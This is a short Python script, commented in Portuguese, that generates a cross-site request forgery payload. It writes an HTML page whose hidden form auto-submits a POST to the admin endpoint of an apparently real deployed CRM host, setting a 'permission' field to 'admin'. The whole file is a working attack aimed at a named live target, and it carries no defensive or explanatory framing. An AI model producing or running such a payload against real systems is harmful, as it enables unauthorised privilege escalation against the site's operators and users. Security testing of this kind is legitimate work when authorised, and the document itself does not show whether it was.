def create_csrf_payload():
    """Cria payload de exemplo para CSRF"""
    html = """
    <html>
      <body>
        <form action="https://scorpions-crm-production.up.railway.app/admin" method="POST">
          <input type="hidden" name="permission" value="admin"/>
          <input type="submit" value="Click me"/>
        </form>
        <script>document.forms[0].submit();</script>
      </body>
    </html>
    """
    return html

with open("csrf.html", "w") as f:
    f.write(create_csrf_payload())

print("Payload CSRF criado em csrf.html")